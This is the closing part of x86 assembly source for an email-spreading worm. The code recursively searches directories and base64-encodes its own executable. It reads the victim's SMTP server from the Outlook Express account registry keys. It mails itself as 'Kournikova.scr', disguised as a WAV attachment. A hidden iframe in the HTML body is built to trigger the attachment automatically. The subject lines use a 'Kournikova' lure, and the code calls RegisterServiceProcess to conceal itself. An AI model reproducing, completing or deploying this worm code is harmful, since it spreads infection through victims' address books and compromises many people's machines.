	push    	dword ptr [RecSearchHandle]
      api     	_FindNextFileA

      or      	eax,eax                         	; If fail, return back to
      jnz     	DirTravel                       	; previous directory

FirstDirNotFound:
      @pushsz 	".."                            	; Set previous directory
      api     	_SetCurrentDirectoryA            

	or      	ebx,ebx                         	; In root -|
      jz      	AllSubDirSearchEnd              	;          |-> Search finish
	
	dec     	ebx                             	; Remonte
	pop     	dword ptr [RecSearchHandle]
	jmp     	FindNextDir

NextDirNotFound:
      push    	dword ptr [RecSearchHandle]          
      api     	_FindClose
	jmp     	FirstDirNotFound

AllSubDirSearchEnd:
	ret

;.......................... Random Number ....................................

; IN:   		Edi
; OUT:  		Random Number in EDX: 0 <-> Edi-1

GetRndNumber:
      push    	eax ebx ecx esi esp ebp
        
      mov     	eax, dword ptr[RandomNb]
      mov     	ecx,41C64E6Dh
      mul     	ecx
      add     	eax,00003039h
      mov     	dword ptr[RandomNb], eax
                      
      xor     	edx, edx
      div     	edi                             	; Reste < Edi in EDX
               
      pop     	ebp esp esi ecx ebx eax          
      ret

;......................... Free The Mem ......................................

FreeTheMem:
	mov		ecx, dword ptr[EmailList]
	jecxz		FreeTheMemNext1
	call		MemFreeIt

FreeTheMemNext1:
	mov		ecx, dword ptr[MemMessageBody1]
	jecxz		FreeTheMemNext2
	call		MemFreeIt
FreeTheMemNext2:
	mov		ecx, dword ptr [MemEncoded]
	jecxz		FreeTheMemNext3
	call		MemFreeIt
FreeTheMemNext3:
	mov		ecx, dword ptr [MemToEncode]
	jecxz		FreeTheMemFin
	call		MemFreeIt

FreeTheMemFin:
	ret

MemFreeIt:
	push		00008000h					; MEM_RELEASE
	push		0
	push		ecx
	api		_VirtualFree
	ret

;..................... Clear TempPath & Name .................................

Clear_TempPath&Name:
       xor     	al,al
       mov     	ecx,260
       lea     	edi,TempPath&Name                	; Clear the path
       rep     	stosb
       ret

;..................... Encode File Base 64 ...................................

; IN:   		Path of the file in offset MyPath
; OUT:		Encoded file in Mem

CodeB64File:

OpenFileToEncode:
      xor     	eax,eax
      push    	eax
      push    	FILE_ATTRIBUTE_NORMAL
      push    	OPEN_EXISTING
      push    	eax
      push    	FILE_SHARE_READ
      push    	GENERIC_READ
      push    	Offset MyPath				; The file to encode
      api     	_CreateFileA
      inc     	eax
      je      	CodeB64FileEnd
      dec     	eax
      mov     	dword ptr [TempFileHandle], eax

GetFileToEncodeSize:
	push		0
	push		eax
	api		_GetFileSize	
	inc		eax
      je      	CodeB64FileEnd
	dec		eax
	mov		dword ptr [OurSizeToEncode], eax

	add		eax, 1000					; Security

GetMemToReadFileToEncode:
      xor     	ebx,ebx
      push    	PAGE_READWRITE                  	; read/write page
	push    	MEM_RESERVE or MEM_COMMIT
	push    	eax
	push    	ebx                             	; System decide where 
	api     	_VirtualAlloc
	test		eax, eax
	je		CodeB64FileEnd
	mov		dword ptr[MemToEncode], eax

ReadFileToEncode:
	push    	00h
	push    	offset ByteReaded
      push    	dword ptr [OurSizeToEncode]
      push    	eax
      push    	dword ptr [TempFileHandle]
      api		_ReadFile
	
	push		dword ptr [TempFileHandle]
	api		_CloseHandle

GetMemToEncodeFile:
	mov		eax, dword ptr [OurSizeToEncode]
	rol		eax, 4					; We need ori size *3 (+security)
	xor     	ebx,ebx
      push    	PAGE_READWRITE                  	; read/write page
	push    	MEM_RESERVE or MEM_COMMIT
	push    	eax
	push    	ebx                             	; System decide where 
	api     	_VirtualAlloc
	test		eax, eax
	je		CodeB64FileEnd
	mov		dword ptr[MemEncoded], eax

AlignFileToEncodeSize:
	mov		eax, dword ptr [OurSizeToEncode]
      push    	3
      pop     	ecx
      xor     	edx,edx                        
      push    	eax
      div     	ecx
      pop     	eax
      sub     	ecx,edx
      add     	eax,ecx					; align size to 3

EncodeFileNow:
      xchg    	eax,ecx
      mov     	edx,dword ptr [MemEncoded]
      mov     	eax,dword ptr [MemToEncode]
      call    	encodeBase64

      mov     	dword ptr [EncodedFileSize],ecx
	
CodeB64FileEnd:
	ret


;................... Encode Base 64 Algorithme ...............................

encodeBase64:							; By Bumblebee
; input:
;       		EAX = Address of data to encode
;       		EDX = Address to put encoded data
;       		ECX = Size of data to encode
; output:
;       		ECX = size of encoded data
;
      xor     	esi,esi
      call    	over_enc_table
      db      	"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
      db      	"abcdefghijklmnopqrstuvwxyz"
      db      	"0123456789+/"
over_enc_table:
      pop     	edi
      push    	ebp
      xor     	ebp,ebp
baseLoop:
      movzx   	ebx,byte ptr [eax]
      shr     	bl,2
      and     	bl,00111111b
      mov     	bh,byte ptr [edi+ebx]
      mov     	byte ptr [edx+esi],bh
      inc     	esi

      mov     	bx,word ptr [eax]
      xchg    	bl,bh
      shr     	bx,4
      mov     	bh,0
      and     	bl,00111111b
      mov     	bh,byte ptr [edi+ebx]
      mov     	byte ptr [edx+esi],bh
      inc     	esi

      inc     	eax
      mov     	bx,word ptr [eax]
      xchg    	bl,bh
      shr     	bx,6
      xor     	bh,bh
      and     	bl,00111111b
      mov     	bh,byte ptr [edi+ebx]
      mov     	byte ptr [edx+esi],bh
      inc     	esi

      inc     	eax
      xor     	ebx,ebx
      movzx   	ebx,byte ptr [eax]
      and     	bl,00111111b
      mov     	bh,byte ptr [edi+ebx]
      mov     	byte ptr [edx+esi],bh
      inc     	esi
      inc     	eax

      inc     	ebp
      cmp     	ebp,24
      jna     	DontAddEndOfLine

      xor     	ebp,ebp                         
      mov     	word ptr [edx+esi],0A0Dh
      inc     	esi
      inc     	esi
      test    	al,00h                          
      org     	$-1
DontAddEndOfLine:
      inc     	ebp
      sub     	ecx,3
      or      	ecx,ecx
      jne     	baseLoop

      mov     	ecx,esi
      add    	edx,esi
      pop     	ebp
      ret

;-----------------------------------------------------------------------------
;------------------------------ Data Zone ------------------------------------
;-----------------------------------------------------------------------------

.data

GetProcName:	db	'GetProcAddress',0
LoadLibName:      db	'LoadLibraryA',0
_GetProcAddress	dd	0
_LoadLibraryA	dd	0

ApiToFind:
	db	'KERNEL32.dll',0
	db	'CloseHandle',0
	db	'CopyFileA',0
	db	'CreateFileA',0
	db	'CreateFileMappingA',0
	db	'CreateMutexA',0
	db	'ExitProcess',0
	db	'GetTickCount',0
	db	'GetModuleFileNameA',0
	db	'GetSystemDirectoryA',0
	db	'GetFileSize',0
	db	'GetModuleHandleA',0
	db	'FindFirstFileA',0
	db	'FindNextFileA',0
	db	'FindClose',0
	db	'GetSystemTime',0
	db	'lstrcat',0
	db	'lstrcmp',0
	db	'lstrlen',0
	db	'MapViewOfFile',0
	db	'OpenMutexA',0
	db	'ReadFile',0
	db	'Sleep',0
	db	'SetCurrentDirectoryA',0
	db	'UnmapViewOfFile',0
	db	'VirtualAlloc',0
	db	'VirtualFree',0
	db	'WinExec',0
	db	'RegisterServiceProcess',0
	db	0

	db 	"WSOCK32.dll",0
	db	'WSAStartup',0
	db	'socket',0
	db	'htons',0
	db	'gethostbyname',0
	db	'connect',0
	db	'recv',0
	db	'send',0
	db	'closesocket',0
	db	'WSACleanup',0
	db	0

	db 	"SHLWAPI.dll",0
	db	'SHSetValueA',0
	db	'SHGetValueA',0
	db	0

	db 	"USER32.dll",0
	db	'MessageBoxA',0
	db	0

	db 	"WININET.dll",0
	db	'InternetGetConnectedState',0
	db	0

	db 	"SHELL32.dll",0
	db	'SHGetSpecialFolderPathA',0
	db	0
	dw	0

ApiFinded:

_CloseHandle		dd	0
_CopyFileA			dd	0
_CreateFileA		dd	0
_CreateFileMappingA	dd	0
_CreateMutexA		dd	0
_ExitProcess		dd	0
_GetTickCount		dd	0
_GetModuleFileNameA	dd	0
_GetSystemDirectoryA	dd	0
_GetFileSize		dd	0
_GetModuleHandleA		dd	0
_FindFirstFileA		dd	0
_FindNextFileA		dd	0
_FindClose			dd	0
_GetSystemTime		dd	0
_lstrcat			dd	0
_lstrcmp			dd	0
_lstrlen			dd	0
_MapViewOfFile		dd	0
_OpenMutexA			dd	0
_ReadFile			dd	0
_Sleep			dd	0
_SetCurrentDirectoryA	dd	0
_UnmapViewOfFile		dd	0
_VirtualAlloc		dd	0
_VirtualFree		dd	0
_WinExec			dd	0
_RegisterServiceProcess dd	0

_WSAStartup			dd	0
_socket			dd	0
_htons			dd	0
_gethostbyname		dd	0
_connect			dd	0
_recv				dd	0
_send				dd	0
_closesocket		dd	0
_WSACleanup			dd	0

_SHSetValueA		dd	0
_SHGetValueA		dd	0

_MessageBoxA		dd	0

_InternetGetConnectedState	dd	0

_SHGetSpecialFolderPathA	dd	0


;-------------------------- Variables Zone -----------------------------------

;...................... Encode B64 Variables

EncodedFileSize	dd	0
MemEncoded		dd	0
MemToEncode		dd	0
OurSizeToEncode	dd	0
ByteReaded        dd    0

;...................... Email SMTP Variables

Reg               dd    1 			; String 
KeySize           dd    0 			; Size to read with SHGetValue 
                                  		; (init it + return effectiv lenght read in)

AccountKey        db    'Software\Microsoft\Internet Account Manager\Accounts\'
AccountSubKey     db    64 dup (0)

SmtpServeur       db	64 dup (0)   	; smtp server found with regkey


wsocket 	      dw	2	      	; sin_family ever AF_INET
		      dw	?             	; the port
ServeurIP	      dd	?	      	; addr of server node
			db	8 dup (?)     	; not used 


hSocket           dd    0               	; Socket Handle   

ServeurReply	dd	?			; error code
ServeurReplyEnd	db	?			; byte for LF



CRLF              equ   <13,10>
	
cmd_helo	      db	'HELO Support',CRLF
cmd_mailfrom	db	'MAIL FROM:<'
cmd_rcptto	      db	'RCPT TO:<'

cmd_data	      db	'DATA',CRLF
cmd_term	      db	CRLF,'.',CRLF
cmd_quit	      db	'QUIT',CRLF


MemMessageBody1	dd	0			; Ptr on Mem where built header
MessageSize1    	dd	0			; Size Header + bordel Mime

MessageBody1:	


	db 'MIME-Version: 1.0',CRLF
	db 'Content-Type: multipart/mixed;',CRLF
	db '        boundary="bound"',CRLF
	db '        X-Priority: 3',CRLF
	db '        X-MSMail-Priority: Normal',CRLF
	db '        X-Mailer: Microsoft Outlook Express 5.50.4522.1300',CRLF
	db '        X-MimeOLE: Produced By Microsoft MimeOLE V5.50.4522.1300',CRLF
	db CRLF
	db 'This is a multi-part message in MIME format.',CRLF
	db CRLF

	db '--bound',CRLF
	db 'Content-Type: text/html;',CRLF
	db '        charset="iso-8859-1"',CRLF
	db 'Content-Transfer-Encoding: quoted-printable',CRLF
	db CRLF
	db '<HTML><HEAD></HEAD><BODY><iframe src=3Dcid:SOMECID height=3D0 width=3D0></iframe>',CRLF
	db '<font>Take a look :)</font></BODY></HTML>',CRLF
	db CRLF

	db '--bound',CRLF
	db 'Content-Type: audio/x-wav;',CRLF
	db '        name="Kournikova.scr"',CRLF
	db 'Content-Transfer-Encoding: base64',CRLF
	db 'Content-ID: <SOMECID>',CRLF
	db CRLF,0

			;	Encoded part

MessageBody2:	db	CRLF,'--bound--',CRLF
MessageSize2    	equ  	$-MessageBody2


RndSubject1		db	'Re:',0
RndSubject2		db	'Kournikova',0
RndSubject3		db	'Re: Kournikova',0

RndSubjectTb:	dd	offset RndSubject1, offset RndSubject2, offset RndSubject3	
NbSubject		equ	($-offset RndSubjectTb)/4


;...................... Email Variables

IConnectedStateTemp     dd      0         ; For InternetConnectedState

CurrentEmail      db    EmailSize dup (0)

mailfrom          db    EmailSize dup (0)


;...................... Residency + Dump Variables

MutexHdl          dd  	0
MyPath            db    260 dup (0)
TempFileHandle    dd    0

;...................... Email Search Variables

NbEmailFound      dd    0       		; Compte combien d'email found
EmailList         dd    0       		; Ptr zone Mem ou stocker Emails 
                                                            
TempPath&Name     db    260 dup (0)

fhandle           dd    0       		; To find & map file
mapaddress        dd    0
maphandle         dd    0                

maphandlemail     dd    0       		; for html found         
esi_save          dd    0
EmailCurrentPos   dd    0

RandomNb          dd    0       		; Init with GettickCount

NbWabEmail        dd    0       		; Nb emails in *.Wab

;...................... Recursive Search Variables

RecSearchHandle 	dd 	0			; For the Recursive search
RoutineToCall	dd	0			; Ptr on routine to execute in all SubDir

;--------------------------- Structures Zone ---------------------------------

;...................... Search File Structure

filetim         	struct
FT_dwLowDateT     dd      ?
FT_dwHighDateT    dd      ?
filetim         	ends

w32fd           struct
FileAttributes    dd      ?
CreationTime      filetim ?
LastAccessTime    filetim ?
LastWriteTime     filetim ?
FileSizeHigh      dd      ?
FileSizeLow       dd      ?
Reserved0         dd      ?
Reserved1         dd      ?
FileName          db      260 dup (0)
AlternateFileN    db      13 dup (?)
                  db      3 dup (?)
w32fd           	ends

search            w32fd   ?

;...................... System Time Structure

SystemTimeData    equ   $ 
STDYear           dw    ?
STDMonth          dw    ?
STDDayOfWeek      dw    ?
STDDay            dw    ?
STDHour           dw    ?
STDMinute         dw    ?
STDSecond         dw    ?
STDMilliseconds   dw   	?

;...................... Sockets Structure

WSAData           equ   $      
            	dw	?
			dw	?
			db	257 dup (?)
			db	129 dup (?)
			dw	?
			dw	?
			dd	?


end Rins











